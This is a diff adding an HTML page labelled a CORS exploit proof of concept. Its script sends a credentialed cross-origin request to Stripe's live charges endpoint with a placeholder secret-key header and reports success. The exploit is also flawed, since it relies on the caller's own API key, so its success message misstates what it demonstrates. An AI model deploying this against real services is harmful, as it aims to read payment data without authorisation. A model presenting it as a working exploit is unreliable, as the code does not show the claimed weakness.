@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button id="exploitButton">Send CORS Request</button>
+
+    <script>
+        document.getElementById("exploitButton").onclick = function() {
+            fetch('https://api.stripe.com/v1/charges', {  // Example endpoint, adjust if needed
+                method: 'GET',
+                credentials: 'include',  // Include cookies for authenticated requests
+                headers: {
+                    'Authorization': 'Bearer YOUR_SECRET_KEY'  // Replace with your API key if authentication is required
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Response Data:", data);
+                alert("CORS request successful. Check the console for response data.");
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        };
+    </script>
+</body>
+</html>
